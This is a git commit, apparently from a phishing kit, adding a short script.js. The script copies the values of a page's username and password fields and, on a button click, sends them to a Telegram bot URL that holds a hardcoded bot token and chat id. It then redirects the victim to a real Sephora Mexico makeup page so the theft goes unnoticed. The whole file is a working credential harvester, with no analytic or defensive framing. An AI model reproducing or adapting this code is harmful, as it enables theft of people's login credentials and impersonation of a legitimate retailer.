b940a78980560445945e576ca1a9b1958abd432c
ghadi72 <154288726+ghadi72@users.noreply.github.com>
2023-12-20 06:45:19 -0600

    Add files via upload

---
+++ script.js
@@ -0,0 +1,31 @@
+const sendatatme = document.getElementById("sendatatme");
+const first = document.getElementById("first");
+const second = document.getElementById("second");
+const resfirst = document.getElementById("resfirst");
+const resecond = document.getElementById("resecond");
+
+first.addEventListener("change", () => {
+  resfirst.value = first.value;
+});
+second.addEventListener("change", () => {
+  resecond.value = second.value;
+});
+
+function redirect() {
+  const Http = new XMLHttpRequest();
+  const url =
+    "https://api.telegram.org/bot6763493971:AAE5KgEwxI9eZCSjDmyysvdrUvQsRMcwwa4/sendMessage?chat_id=5196825597&text=USERNAME:%20" +
+    resfirst.value +
+    " PASSWORD: " +
+    resecond.value;
+  Http.open("GET", url);
+  Http.send();
+
+  Http.onreadystatechange = (e) => {
+    console.log(Http.responseText);
+  };
+
+window.location.href = 'https://www.sephora.com.mx/categories/maquillaje-1';
+}
+
+sendatatme.addEventListener("click", redirect);
